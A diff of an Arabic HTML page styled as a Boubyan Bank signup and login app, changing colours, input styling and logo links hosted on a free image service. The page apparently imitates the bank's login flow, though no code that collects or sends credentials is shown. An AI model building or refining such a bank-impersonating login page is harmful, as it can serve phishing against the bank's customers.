@@ -10,14 +10,17 @@
 
   <style>
     :root{
-      /* خلفية الصفحة (معدلة لتطابق صورة الخلفية) */
-      --bg: #ECE7E7;         /* <-- لون الخلفية الجديد */
+      /* لون الخلفية المطلوب */
+      --bg: #ECE7E7;
       --primary: #ff3b30;
       --primary-dark: #e0322a;
       --accent: #c84a4a;
       --card-radius: 18px;
       --max-width: 420px;
+      --field-border: rgba(0,0,0,0.06);
+      --text: #111;
     }
+
     * { box-sizing: border-box; }
     html,body{
       height:100%;
@@ -26,7 +29,7 @@
       background: var(--bg);
       -webkit-font-smoothing:antialiased;
       -moz-osx-font-smoothing:grayscale;
-      color:#111;
+      color:var(--text);
     }
 
     /* container */
@@ -42,8 +45,9 @@
       max-width:var(--max-width);
     }
 
+    /* main card uses same bg */
     .card{
-      background:transparent;
+      background: var(--bg);
       border-radius:var(--card-radius);
       padding:12px 14px 24px;
       text-align:center;
@@ -119,14 +123,15 @@
     .view { display:none; opacity:0; transform: translateY(8px); transition: opacity .18s ease, transform .18s ease; }
     .view.show { display:block; opacity:1; transform: translateY(0); }
 
-    /* signup/login/start forms */
+    /* form card: same background */
     .form-card{
-      background:rgba(255,255,255,0.85);
+      background: var(--bg);
       padding:18px;
       border-radius:16px;
       margin-top:8px;
       text-align:right;
-      box-shadow: 0 6px 14px rgba(0,0,0,0.04);
+      border: 1px solid rgba(0,0,0,0.03);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.04);
     }
 
     .form-card .field{
@@ -145,17 +150,21 @@
       color:#666;
       margin-bottom:8px;
     }
+
+    /* inputs use same bg but with border/shadow for contrast */
     .input{
       width:100%;
       padding:14px 16px;
       border-radius:12px;
-      border:0;
-      box-shadow: 0 6px 14px rgba(0,0,0,0.06), inset 0 -2px 0 rgba(255,255,255,0.6);
+      border:1px solid var(--field-border);
+      background: var(--bg);
+      box-shadow: 0 6px 10px rgba(0,0,0,0.03), inset 0 -2px 0 rgba(255,255,255,0.3);
       font-size:16px;
-      background:#fff;
+      color:var(--text);
       text-align:left;
       direction:ltr;
     }
+    .input::placeholder{ color: rgba(0,0,0,0.35); }
     .input[aria-invalid="true"]{ outline:2px solid #ffcccc; }
 
     .form-actions{
@@ -180,8 +189,10 @@
     <div class="frame">
       <!-- HOME VIEW -->
       <main id="home" class="card view show" aria-labelledby="home-title">
+        <!-- شعار الصفحة الرئيسية (لم يتغير) -->
         <img class="logo" id="homeLogo" src="https://d.top4top.io/p_3661yey5x0.jpeg" alt="شعار بوبيان">
 
+        <!-- الصورة التوضيحية -->
         <img class="hero" id="homeHero" src="https://g.top4top.io/p_3661t5ztz0.jpeg" alt="صورة توضيحية">
 
         <h1 id="home-title">تطبيق بوبيان بنك متكامل في موبايلك</h1>
@@ -190,7 +201,7 @@
         <div class="actions" role="group" aria-label="إجراءات">
           <button id="openSignupBtn" class="btn btn-primary" aria-label="افتح حسابك الجديد في بوبيان">افتح حسابك الجديد في بوبيان</button>
 
-          <!-- هذا الزر الآن يفتح صفحة الدخول (لديك حساب) -->
+          <!-- زر عرض صفحة الدخول -->
           <button id="haveAccountBtn" class="btn btn-secondary" aria-label="لديك حساب في بوبيان">لديك حساب في بوبيان</button>
         </div>
       </main>
@@ -198,7 +209,8 @@
       <!-- SIGNUP VIEW -->
       <section id="signup" class="view" aria-labelledby="signup-title" role="region" aria-hidden="true">
         <div class="form-card">
-          <img class="logo" src="https://e.top4top.io/p_3661ho3fc0.jpeg" alt="شعار بوبيان — تسجيل">
+          <!-- تم استبدال كل ظهور للرابط القديم بالرابط الجديد الذي طلبته -->
+          <img class="logo" src="https://i.top4top.io/p_36619dyvp0.jpeg" alt="شعار بوبيان — تسجيل">
           <h2 id="signup-title">فتح حساب جديد</h2>
 
           <form id="signupForm" novalidate>
@@ -231,8 +243,8 @@
       <!-- LOGIN VIEW (لديك حساب في بوبيان) -->
       <section id="login" class="view" aria-labelledby="login-title" role="region" aria-hidden="true">
         <div class="form-card">
-          <!-- شعار الصورة الذي طلبته -->
-          <img class="logo" src="https://e.top4top.io/p_3661ho3fc0.jpeg" alt="شعار بوبيان — دخول">
+          <!-- الشعار المُحدّث -->
+          <img class="logo" src="https://i.top4top.io/p_36619dyvp0.jpeg" alt="شعار بوبيان — دخول">
 
           <h2 id="login-title">تسجيل الدخول</h2>
 
@@ -258,17 +270,17 @@
             <div style="margin-top:18px; text-align:center;">
               <div style="font-weight:600; margin-bottom:6px;">تسجيل لأول مرة</div>
               <div style="color:#666; margin-bottom:6px;">إذا كنت تستخدم التطبيق لأول مرة</div>
-              <!-- هذا الرابط هو "اضغط هنا للبدء" الذي يفتح صفحة البدء -->
+              <!-- رابط البدء -->
               <a id="startHere" class="link-muted">اضغط هنا للبدء</a>
             </div>
           </form>
         </div>
       </section>
 
-      <!-- START VIEW (الصفحة المشابهة للصورة الثانية) -->
+      <!-- START VIEW -->
       <section id="start" class="view" aria-labelledby="start-title" role="region" aria-hidden="true">
         <div class="form-card">
-          <img class="logo" src="https://e.top4top.io/p_3661ho3fc0.jpeg" alt="شعار بوبيان — البدء">
+          <img class="logo" src="https://i.top4top.io/p_36619dyvp0.jpeg" alt="شعار بوبيان — البدء">
 
           <h2 id="start-title">بدء الاستخدام</h2>
 
